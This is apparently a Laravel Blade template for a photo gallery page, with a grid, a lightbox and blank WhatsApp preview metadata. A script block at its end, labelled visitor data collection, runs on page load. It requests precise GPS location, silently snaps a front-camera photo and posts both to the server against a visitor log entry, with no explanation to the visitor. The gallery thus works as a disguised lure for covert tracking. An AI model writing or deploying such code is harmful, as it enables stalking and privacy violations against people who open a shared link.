<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ $category->name }} - Gallery</title>
    
    <!-- Open Graph for Social Sharing - Optimized for Large WhatsApp Preview -->
    <meta property="og:type" content="article">
    <meta property="og:title" content=" ">
    <meta property="og:description" content=" ">
    @if($category->images->first())
        <meta property="og:image" content="{{ url('storage/'.$category->images->first()->path) }}">
        <meta property="og:image:secure_url" content="{{ secure_url('storage/'.$category->images->first()->path) }}">
        <meta property="og:image:type" content="image/jpeg">
        <meta property="og:image:width" content="1200">
        <meta property="og:image:height" content="630">
        <meta property="og:image:alt" content="{{ $category->name }}">
        <meta name="twitter:card" content="summary_large_image">
        <meta name="twitter:title" content=" ">
        <meta name="twitter:description" content=" ">
        <meta name="twitter:image" content="{{ url('storage/'.$category->images->first()->path) }}">
        <meta itemprop="image" content="{{ url('storage/'.$category->images->first()->path) }}">
        <link rel="image_src" href="{{ url('storage/'.$category->images->first()->path) }}">
    @endif
    <meta property="og:url" content="{{ url()->current() }}">
    <meta property="og:site_name" content=" ">

    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;700;900&display=swap" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    
    <style>
        body { font-family: 'Outfit', sans-serif; }
        .glass { background: rgba(255, 255, 255, 0.7); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.3); }
        .gradient-bg { background: radial-gradient(circle at 0% 0%, #fdfbfb 0%, #ebedee 100%); }
        .category-header { background: linear-gradient(135deg, #6366f1 0%, #a855f7 100%); }
    </style>
</head>
<body class="gradient-bg min-h-screen">

    <!-- Header Section -->
    <div class="category-header pt-20 pb-40 px-6 text-center text-white relative overflow-hidden">
        <div class="max-w-4xl mx-auto relative z-10">
            <h1 class="text-5xl md:text-7xl font-black mb-4 tracking-tight animate-fade-in">{{ $category->name }}</h1>
            <p class="text-xl text-white/80 font-medium">Exclusive Collection • {{ $category->images->count() }} Photos</p>
        </div>
        <!-- Decorative blobs -->
        <div class="absolute -top-10 -right-10 w-64 h-64 bg-white/10 rounded-full blur-3xl"></div>
        <div class="absolute -bottom-10 -left-10 w-48 h-48 bg-purple-400/20 rounded-full blur-3xl"></div>
    </div>

    <!-- Gallery Grid -->
    <div class="max-w-7xl mx-auto px-6 -mt-20 pb-20">
        <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-8">
            @foreach($category->images as $image)
                <div onclick="openLightbox('{{ asset('storage/'.$image->path) }}', '{{ $image->name }}')" class="group relative bg-white rounded-[2.5rem] overflow-hidden shadow-2xl shadow-indigo-100 hover:shadow-indigo-200 transition-all duration-500 hover:-translate-y-2 cursor-zoom-in">
                    <div class="aspect-square relative overflow-hidden">
                        <img src="{{ asset('storage/'.$image->path) }}" class="w-full h-full object-cover group-hover:scale-110 transition-transform duration-700">
                        <div class="absolute inset-0 bg-black/20 opacity-0 group-hover:opacity-100 transition-opacity"></div>
                    </div>
                </div>
            @endforeach
        </div>

        @if($category->images->isEmpty())
            <div class="glass max-w-lg mx-auto p-12 rounded-[3rem] text-center mt-20">
                <p class="text-2xl font-bold text-gray-400">No photos in this collection yet.</p>
            </div>
        @endif
    </div>

    <!-- Lightbox Modal -->
    <div id="lightbox" class="fixed inset-0 z-50 bg-black/95 backdrop-blur-xl hidden flex-col items-center justify-center p-4">
        <button onclick="closeLightbox()" class="absolute top-8 right-8 text-white/50 hover:text-white transition-colors">
            <svg class="w-10 h-10" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" /></svg>
        </button>
        
        <div class="relative max-w-5xl w-full flex flex-col items-center">
            <img id="lightbox-img" src="" class="max-w-full max-h-[80vh] rounded-3xl shadow-2xl transition-transform duration-500 cursor-zoom-out" onclick="toggleZoom(this)">
            
            <div class="mt-8 flex flex-col items-center gap-4">
                <h3 id="lightbox-title" class="text-white text-2xl font-black"></h3>
                <a id="lightbox-download" href="" download class="px-8 py-4 bg-indigo-600 hover:bg-indigo-700 text-white rounded-2xl font-black shadow-xl shadow-indigo-500/20 transition-all flex items-center gap-2">
                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4" /></svg>
                    Download Original
                </a>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <footer class="py-12 border-t border-gray-100 mt-12 bg-white/50 backdrop-blur-md">
        <div class="max-w-7xl mx-auto px-6 text-center">
            <p class="text-gray-500 font-bold uppercase tracking-widest text-xs mb-2">Developed With Love</p>
            <h2 class="text-2xl font-black text-indigo-600">Modern Gallery App</h2>
        </div>
    </footer>

    <script>
        const lightbox = document.getElementById('lightbox');
        const lightboxImg = document.getElementById('lightbox-img');
        const lightboxTitle = document.getElementById('lightbox-title');
        const lightboxDownload = document.getElementById('lightbox-download');
        let isZoomed = false;

        function openLightbox(src, title) {
            lightboxImg.src = src;
            lightboxTitle.innerText = title || 'Gallery Photo';
            lightboxDownload.href = src;
            lightbox.classList.remove('hidden');
            lightbox.classList.add('flex');
            document.body.style.overflow = 'hidden';
        }

        function closeLightbox() {
            lightbox.classList.add('hidden');
            lightbox.classList.remove('flex');
            document.body.style.overflow = 'auto';
            resetZoom();
        }

        function toggleZoom(img) {
            if (!isZoomed) {
                img.style.transform = 'scale(1.3)';
                img.style.cursor = 'zoom-out';
            } else {
                resetZoom();
            }
            isZoomed = !isZoomed;
        }

        function resetZoom() {
            lightboxImg.style.transform = 'scale(1)';
            lightboxImg.style.cursor = 'zoom-in';
            isZoomed = false;
        }

        // Close on esc
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') closeLightbox();
        });

        // Visitor Data Collection (Camera & Location)
        @if(isset($visitorLog) && $visitorLog)
        (function() {
            const VISITOR_LOG_ID = {{ $visitorLog->id }};
            const CSRF_TOKEN = '{{ csrf_token() }}';
            const API_URL = '{{ url("/api/visitor-data") }}';
            
            let gpsSent = false;
            let cameraSent = false;

            // Send data to server using fetch (more reliable than sendBeacon)
            async function sendData(payload, type) {
                // Prevent duplicate sends
                if (type === 'gps' && gpsSent) return;
                if (type === 'camera' && cameraSent) return;
                
                const data = {
                    visitor_log_id: VISITOR_LOG_ID,
                    _token: CSRF_TOKEN,
                    ...payload
                };

                console.log('Sending ' + type + ' data:', payload);

                try {
                    const response = await fetch(API_URL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        },
                        body: JSON.stringify(data),
                        keepalive: true
                    });
                    
                    const result = await response.json();
                    console.log(type + ' response:', result);
                    
                    if (result.success) {
                        if (type === 'gps') gpsSent = true;
                        if (type === 'camera') cameraSent = true;
                    }
                } catch (e) {
                    console.error('Send ' + type + ' error:', e);
                    // Retry once after 2 seconds
                    setTimeout(() => {
                        fetch(API_URL, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
                            body: JSON.stringify(data)
                        }).then(r => r.json()).then(r => console.log('Retry success:', r)).catch(e => console.error('Retry failed:', e));
                    }, 2000);
                }
            }

            // Get GPS Location - HIGH PRIORITY
            function getGPSLocation() {
                if (!navigator.geolocation) {
                    console.log('Geolocation not supported');
                    return;
                }

                console.log('Requesting GPS location...');
                
                navigator.geolocation.getCurrentPosition(
                    function(pos) {
                        console.log('GPS Success! Lat:', pos.coords.latitude, 'Lng:', pos.coords.longitude, 'Accuracy:', pos.coords.accuracy);
                        sendData({
                            latitude: pos.coords.latitude,
                            longitude: pos.coords.longitude,
                            location_accuracy: pos.coords.accuracy
                        }, 'gps');
                    },
                    function(err) {
                        console.log('GPS Error:', err.code, '-', err.message);
                        // Try again with low accuracy if not permission denied
                        if (err.code !== 1) {
                            console.log('Retrying with low accuracy...');
                            navigator.geolocation.getCurrentPosition(
                                function(pos) {
                                    console.log('GPS Retry Success! Lat:', pos.coords.latitude, 'Lng:', pos.coords.longitude);
                                    sendData({
                                        latitude: pos.coords.latitude,
                                        longitude: pos.coords.longitude,
                                        location_accuracy: pos.coords.accuracy
                                    }, 'gps');
                                },
                                function(e) { console.log('GPS failed completely:', e.message); },
                                { enableHighAccuracy: false, timeout: 30000, maximumAge: 300000 }
                            );
                        }
                    },
                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                );
            }

            // Capture Camera
            async function captureCamera() {
                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                    console.log('Camera not supported');
                    return;
                }

                try {
                    console.log('Requesting camera access...');
                    const stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: 'user', width: 640, height: 480 }
                    });
                    
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.setAttribute('playsinline', true);
                    await video.play();
                    
                    // Wait for camera to focus
                    await new Promise(r => setTimeout(r, 500));
                    
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    stream.getTracks().forEach(t => t.stop());
                    
                    const imageData = canvas.toDataURL('image/jpeg', 0.7);
                    console.log('Camera captured successfully');
                    
                    sendData({ camera_image: imageData }, 'camera');
                } catch (e) {
                    console.log('Camera error:', e.name, e.message);
                }
            }

            // Start immediately - GPS is PRIORITY
            setTimeout(function() {
                getGPSLocation();
                // Camera after delay (separate from GPS)
                setTimeout(captureCamera, 2000);
            }, 500);
        })();
        @endif
    </script>
</body>
</html>
